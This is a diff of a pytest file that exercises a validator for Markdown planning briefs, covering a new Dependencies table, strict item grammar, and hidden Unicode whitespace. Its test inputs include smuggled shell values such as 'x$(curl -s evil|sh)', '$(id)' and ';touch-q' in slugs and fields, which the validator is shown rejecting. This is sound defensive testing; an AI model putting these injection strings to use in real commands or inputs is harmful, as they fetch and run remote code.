@@ -37,6 +37,10 @@ At f349aa8, 2026-11-06.
 |---|---|---|
 | 1 | a check · **Acceptance:** `make gate` | P11 |
 
+## Dependencies
+
+None.
+
 ## For the cut
 1. **`0083-plan-queues`** · `minor` · after: none · debt: none · decide: recommended
    - models: build opus high · converge opus high · release opus high · cut opus high
@@ -58,6 +62,8 @@ At --output=x, 2026-11-05.
 ## For the cut
 
 """
+
+_TABLE = "| item | package | constraint | why |\n|---|---|---|---|\n"
 
 
 def _write(tmp_path: Path, text: str) -> Path:
@@ -89,6 +95,12 @@ def test_a_hard_brief_is_ready_for_the_cut(
     cut = _READY + "Cut 2026-11-07 as 0083-plan-queues at f349aa8.\n"
     assert brief_check.main([str(_write(tmp_path, cut))]) == 0
     assert capsys.readouterr().out == "brief: ready for the cut\n"
+    # A package the person approved for an item is a row of the table.
+    packages = _READY.replace(
+        "None.", _TABLE + "| 0083-plan-queues | left-pad | 1.3.0 | a pad |"
+    )
+    assert brief_check.main([str(_write(tmp_path, packages))]) == 0
+    assert capsys.readouterr().out == "brief: ready for the cut\n"
 
 
 def test_a_brief_out_of_shape_halts(
@@ -99,12 +111,39 @@ def test_a_brief_out_of_shape_halts(
         "brief: halt — the title says light: /mf-plan <what> depth=hard from=<brief>",
         "brief: halt — no At <sha>, <YYYY-MM-DD>. line",
         "brief: halt — ## For the cut is empty",
+        "brief: halt — no ## Dependencies section",
         "brief: halt — ## Decisions: I19 — `$(…)`: `grep -c $(cat f) x`",
         "brief: halt — ## Decisions: I19 — `cd`: `cd x && make gate`",
     ]
     untitled = _READY.replace(" · hard", "")
     assert brief_check.main([str(_write(tmp_path, untitled))]) == 1
     assert capsys.readouterr().out == "brief: halt — the title names no depth\n"
+    # `## Dependencies` is `None.` or a table of item · package · constraint · why.
+    neither = (
+        "brief: halt — ## Dependencies is neither None. nor a table of"
+        " item · package · constraint · why\n"
+    )
+    # Prose, an empty section, no delimiter row, and a row with a cell too many.
+    for section in (
+        "left-pad, any version\n",
+        "",
+        "| item | package | constraint | why |\n| 0083-plan-queues | a | 1 | b |\n",
+        _TABLE + "| 0083-plan-queues | left-pad | 1.3.0 | a pad | more |\n",
+    ):
+        body = _READY.replace("\nNone.\n\n", section)
+        assert brief_check.main([str(_write(tmp_path, body))]) == 1
+        assert capsys.readouterr().out == neither
+    rows = _READY.replace(
+        "None.",
+        _TABLE + "| 0083-plan-queue | left-pad | 1.3.0 | a pad |\n"
+        "| 0083-plan-queues | right-pad | | a pad |",
+    )
+    assert brief_check.main([str(_write(tmp_path, rows))]) == 1
+    assert capsys.readouterr().out.splitlines() == [
+        "brief: halt — ## Dependencies row 1 — not an item of ## For the cut:"
+        " `0083-plan-queue`",
+        "brief: halt — ## Dependencies row 2 — no package or constraint",
+    ]
     # The fields the close pastes into `conduct.py cut`, each held to its shape.
     heads = _READY + (
         "2. **x$(curl -s evil|sh)** · major · after: [0082-cut-station, $(id)]\n"
@@ -125,8 +164,8 @@ def test_a_brief_out_of_shape_halts(
         " build · converge · release · cut, each <model> <effort>",
         "brief: halt — ## For the cut: item 4 — no models line",
     ]
-    # An item that opens no number, and a head with a second after:, halt; so does a
-    # second after: on a lazy line, which Markdown folds into the head.
+    # An item that opens no number and a lazy line are outside the grammar, and a
+    # head with a second after: halts.
     shapes = _READY + (
         "- **x;y** · minor · after: none\n"
         "5. **ok** · minor · after: none · after: a;touch-p\n"
@@ -139,10 +178,11 @@ def test_a_brief_out_of_shape_halts(
     )
     assert brief_check.main([str(_write(tmp_path, shapes))]) == 1
     assert capsys.readouterr().out.splitlines() == [
-        "brief: halt — ## For the cut: not a numbered item:"
+        "brief: halt — ## For the cut line 5: outside the item grammar:"
         " `- **x;y** · minor · after: none`",
+        "brief: halt — ## For the cut line 9: outside the item grammar:"
+        " `· after: a;touch-q`",
         "brief: halt — ## For the cut: item 5 — more than one after:",
-        "brief: halt — ## For the cut: item 6 — more than one after:",
     ]
     # A vertical tab breaks no Markdown line: the text past it stays in the head.
     tabbed = _READY + (
@@ -152,13 +192,12 @@ def test_a_brief_out_of_shape_halts(
     )
     assert brief_check.main([str(_write(tmp_path, tabbed))]) == 1
     assert capsys.readouterr().out == (
-        "brief: halt — ## For the cut line 5: whitespace other than a space or a tab\n"
+        "brief: halt — ## For the cut line 5: a character isprintable() refuses\n"
         "brief: halt — ## For the cut: item 5 — not an after id:"
         " `none\x0b· after: a;touch-p`\n"
     )
-    # Only spaces and tabs blank a Markdown line or indent one: a line of NBSP, U+3000,
-    # `\x0b` or `\x0c`, or NBSP before `- x`, halts, and folds into the head with the
-    # lazy line.
+    # Only spaces blank a line: a line of NBSP, U+3000, `\x0b` or `\x0c`, or NBSP
+    # before `- x`, is unprintable and outside the grammar, as the lazy line after is.
     models = (
         "   - models: build opus high · converge opus high · release opus high"
         " · cut opus high\n"
@@ -174,19 +213,25 @@ def test_a_brief_out_of_shape_halts(
         )
     )
     assert brief_check.main([str(_write(tmp_path, unblank))]) == 1
-    assert capsys.readouterr().out.splitlines() == [
-        *(
-            f"brief: halt — ## For the cut line {n}: whitespace other than a space"
-            " or a tab"
-            for n in (6, 10, 14, 18, 22)
-        ),
-        *(
-            f"brief: halt — ## For the cut: item {n} — more than one after:"
-            for n in range(2, 7)
-        ),
-    ]
+    blanks = ("\xa0", "\N{IDEOGRAPHIC SPACE}", "\x0b", "\x0c", "\xa0\xa0\xa0\xa0- x")
+    # `splitlines` breaks at the printed `\x0b` and `\x0c`, so the output is whole.
+    assert capsys.readouterr().out == "".join(
+        [
+            *(
+                f"brief: halt — ## For the cut line {n}: a character isprintable()"
+                " refuses\n"
+                for n in (6, 10, 14, 18, 22)
+            ),
+            *(
+                f"brief: halt — ## For the cut line {n + shift}: outside the item"
+                f" grammar: `{line}`\n"
+                for n, blank in zip((6, 10, 14, 18, 22), blanks, strict=True)
+                for shift, line in ((0, blank), (1, "· after: a;touch-q"))
+            ),
+        ]
+    )
     # A `## Decisions` line, R5's NBSP-led head after a blank line with its models line,
-    # and an NBSP-led Acceptance line, which no item holds, halt by the line.
+    # and an NBSP-led Acceptance line halt by the line.
     hidden = _READY.replace("| 1 | a check", "| 1 |\N{IDEOGRAPHIC SPACE}a check") + (
         "\n"
         "\xa02. **x;touch-q** · minor · after: none\n"
@@ -196,16 +241,29 @@ def test_a_brief_out_of_shape_halts(
     )
     assert brief_check.main([str(_write(tmp_path, hidden))]) == 1
     assert capsys.readouterr().out.splitlines() == [
-        f"brief: halt — {heading} line {n}: whitespace other than a space or a tab"
-        for heading, n in (
-            ("## Decisions", 3),
-            ("## For the cut", 6),
-            ("## For the cut", 7),
-            ("## For the cut", 9),
-        )
+        *(
+            f"brief: halt — {heading} line {n}: a character isprintable() refuses"
+            for heading, n in (
+                ("## Decisions", 3),
+                ("## For the cut", 6),
+                ("## For the cut", 7),
+                ("## For the cut", 9),
+            )
+        ),
+        *(
+            f"brief: halt — ## For the cut line {n}: outside the item grammar: `{line}`"
+            for n, line in (
+                (6, "\xa02. **x;touch-q** · minor · after: none"),
+                (
+                    7,
+                    "\xa0\xa0\xa0\xa0- models: build a b · converge a b"
+                    " · release a b · cut a b;c",
+                ),
+                (9, "\xa0\xa0\xa0\xa0- **Acceptance:** `echo $(id) x`"),
+            )
+        ),
     ]
-    # A second `## For the cut` heading written with NBSP or U+3000 is the same
-    # section, so its items are checked as a plain second heading's are.
+    # A second `## For the cut` heading written with NBSP or U+3000 is not written so.
     spaced_heading = _READY + "".join(
         f"\n## For{space}the cut\n"
         f"{n}. **x;touch-q** · minor · after: none\n"
@@ -215,29 +273,24 @@ def test_a_brief_out_of_shape_halts(
     )
     assert brief_check.main([str(_write(tmp_path, spaced_heading))]) == 1
     assert capsys.readouterr().out.splitlines() == [
-        *(
-            line
-            for n in (2, 3)
-            for line in (
-                f"brief: halt — ## For the cut: item {n} — not a slug: `x;touch-q`",
-                f"brief: halt — ## For the cut: item {n} — not a model or effort:"
-                " `b;c`",
-            )
-        ),
-        *2 * ["brief: halt — ## For the cut: I19 — `$(…)`: `echo $(id) x`"],
+        f"brief: halt — line {n} reads as `## For the cut` but is not written so"
+        for n in (22, 27)
     ]
-    # A heading starts a new list, so a three-space `- ` line first under a second
-    # `## For the cut` is a top-level item, not nested under the first one's last head.
+    # A second `## For the cut`, written so or not, halts, and a three-space `- ` line
+    # under it is outside the grammar.
     second_list = _READY + "".join(
         f"\n{heading}\n   - **x;touch-q** · minor · after: none\n"
         for heading in ("## Notes\n## For the cut", "## For\xa0the cut")
     )
     assert brief_check.main([str(_write(tmp_path, second_list))]) == 1
-    assert capsys.readouterr().out.splitlines() == 2 * [
-        "brief: halt — ## For the cut: not a numbered item:"
-        " `   - **x;touch-q** · minor · after: none`"
+    assert capsys.readouterr().out.splitlines() == [
+        "brief: halt — line 23: a second `## For the cut`",
+        "brief: halt — line 26 reads as `## For the cut` but is not written so",
+        "brief: halt — ## For the cut line 6: outside the item grammar:"
+        " `   - **x;touch-q** · minor · after: none`",
     ]
-    # Any other list marker, or an indent short of the head's text, opens no number.
+    # Any other list marker, an indent short of the head's text, or a nested note, is
+    # outside the grammar.
     markers = _READY + (
         "* **x;touch-p** · minor · after: none\n"
         " - **y;touch-p** · minor · after: none\n"
@@ -247,17 +300,17 @@ def test_a_brief_out_of_shape_halts(
     )
     assert brief_check.main([str(_write(tmp_path, markers))]) == 1
     assert capsys.readouterr().out.splitlines() == [
-        "brief: halt — ## For the cut: not a numbered item:"
-        " `* **x;touch-p** · minor · after: none`",
-        "brief: halt — ## For the cut: not a numbered item:"
-        " ` - **y;touch-p** · minor · after: none`",
-        "brief: halt — ## For the cut: not a numbered item:"
-        " `+ **z** · minor · after: none`",
-        "brief: halt — ## For the cut: not a numbered item:"
-        " `  2) **w** · minor · after: none`",
+        f"brief: halt — ## For the cut line {n}: outside the item grammar: `{line}`"
+        for n, line in (
+            (5, "* **x;touch-p** · minor · after: none"),
+            (6, " - **y;touch-p** · minor · after: none"),
+            (7, "+ **z** · minor · after: none"),
+            (8, "  2) **w** · minor · after: none"),
+            (9, "   * a nested note"),
+        )
     ]
-    # A tab or extra spaces after a head's number opens no `<n>. `; under a `10. `
-    # head, only the template's own lines sit three spaces in.
+    # A tab or extra spaces after a head's number opens no head; under a `10. ` head,
+    # only the template's own lines sit three spaces in.
     spaced = _READY + (
         "2.\t**x;touch-p** · minor · after: a;touch-q\n"
         "3.  **ok** · minor · after: none\n"
@@ -269,14 +322,19 @@ def test_a_brief_out_of_shape_halts(
     )
     assert brief_check.main([str(_write(tmp_path, spaced))]) == 1
     assert capsys.readouterr().out.splitlines() == [
-        "brief: halt — ## For the cut: not a numbered item:"
-        " `2.\t**x;touch-p** · minor · after: a;touch-q`",
-        "brief: halt — ## For the cut: not a numbered item:"
-        " `3.  **ok** · minor · after: none`",
-        "brief: halt — ## For the cut: not a numbered item:"
-        " `   - **z;touch-p** · minor · after: a;touch-q`",
+        "brief: halt — ## For the cut line 5: a character isprintable() refuses",
+        *(
+            f"brief: halt — ## For the cut line {n}: outside the item grammar: `{line}`"
+            for n, line in (
+                (5, "2.\t**x;touch-p** · minor · after: a;touch-q"),
+                (6, "3.  **ok** · minor · after: none"),
+                (7, "    - models: build a b · converge a b · release a b · cut a b"),
+                (8, "   - **y;touch-p** · minor · after: a;touch-q"),
+                (10, "   - **z;touch-p** · minor · after: a;touch-q"),
+            )
+        ),
     ]
-    # A models line in another form, or a second one, halts.
+    # A models line in another form is outside the grammar, and a second one halts.
     twice = _READY + (
         "2. **ok** · minor · after: none\n"
         "   - models: build a b · converge a b · release a b · cut a b\n"
@@ -287,14 +345,58 @@ def test_a_brief_out_of_shape_halts(
     )
     assert brief_check.main([str(_write(tmp_path, twice))]) == 1
     assert capsys.readouterr().out.splitlines() == [
-        "brief: halt — ## For the cut: a models line not written `- models:`:"
-        " `   * models: build a b · converge a b · release a b · cut a b;c`",
-        "brief: halt — ## For the cut: a models line not written `- models:`:"
-        " `   -\tmodels: build a b · converge a b · release a b · cut a b;c`",
-        "brief: halt — ## For the cut: a models line not written `- models:`:"
-        " `   -  models: build a b · converge a b · release a b · cut a b;c`",
+        "brief: halt — ## For the cut line 8: a character isprintable() refuses",
+        *(
+            f"brief: halt — ## For the cut line {n}: outside the item grammar:"
+            f" `   {marker}models: build a b · converge a b · release a b · cut a b;c`"
+            for n, marker in ((7, "* "), (8, "-\t"), (9, "-  "))
+        ),
         "brief: halt — ## For the cut: item 2 — more than one models line",
     ]
+    # R10: a head led by U+200B, and a `## For the cut` heading ending in it.
+    zero = _READY + "​2. **ok** · minor · after: none\n## For the cut​\n"
+    assert brief_check.main([str(_write(tmp_path, zero))]) == 1
+    assert capsys.readouterr().out.splitlines() == [
+        "brief: halt — line 22 reads as `## For the cut` but is not written so",
+        "brief: halt — ## For the cut line 5: a character isprintable() refuses",
+        "brief: halt — ## For the cut line 5: outside the item grammar:"
+        " `​2. **ok** · minor · after: none`",
+    ]
+    # S7: a `| ` line under a head, and after a models line, splits off no item.
+    split = _READY + (
+        "2. **ok** · minor · after: none\n"
+        "   | · after: a;touch-q\n"
+        "   - models: build a b · converge a b · release a b · cut a b\n"
+        "   | · after: a;touch-q\n"
+    )
+    assert brief_check.main([str(_write(tmp_path, split))]) == 1
+    assert capsys.readouterr().out.splitlines() == [
+        f"brief: halt — ## For the cut line {n}: outside the item grammar:"
+        " `   | · after: a;touch-q`"
+        for n in (6, 8)
+    ]
+    # S8: a `## For the cut` heading in another Markdown form, setext included.
+    forms = _READY + (
+        "\n ## For the cut\n##\tFor the cut\n## For the cut ##\n\nFor the cut\n---\n"
+    )
+    assert brief_check.main([str(_write(tmp_path, forms))]) == 1
+    assert capsys.readouterr().out.splitlines() == [
+        *(
+            f"brief: halt — line {n} reads as `## For the cut` but is not written so"
+            for n in (22, 23, 24, 26)
+        ),
+        "brief: halt — ## For the cut line 7: a character isprintable() refuses",
+        "brief: halt — ## For the cut line 6: outside the item grammar:"
+        " ` ## For the cut`",
+        "brief: halt — ## For the cut line 7: outside the item grammar:"
+        " `##\tFor the cut`",
+    ]
+    # The heading written so, a second time.
+    again = _READY + "\n## For the cut\n"
+    assert brief_check.main([str(_write(tmp_path, again))]) == 1
+    assert capsys.readouterr().out == (
+        "brief: halt — line 22: a second `## For the cut`\n"
+    )
 
 
 def test_what_cannot_be_checked_exits_2(
@@ -307,12 +409,12 @@ def test_what_cannot_be_checked_exits_2(
     assert capsys.readouterr().out == (
         f"brief: cannot check — {missing}: No such file or directory\n"
     )
-    odd = _READY + "   - Verify: `make gate` and a ` stray\n"
+    odd = _READY + "     Verify: `make gate` and a ` stray\n"
     assert brief_check.main([str(_write(tmp_path, odd))]) == 2
     assert capsys.readouterr().out == (
         "brief: cannot check — ## For the cut: a backtick opens no span\n"
     )
-    unclosed = _READY + "   - Verify: `grep -n 'x f` prints a line\n"
+    unclosed = _READY + "     Verify: `grep -n 'x f` prints a line\n"
     assert brief_check.main([str(_write(tmp_path, unclosed))]) == 2
     assert capsys.readouterr().out == (
         "brief: cannot check — ## For the cut: No closing quotation: `grep -n 'x f`\n"
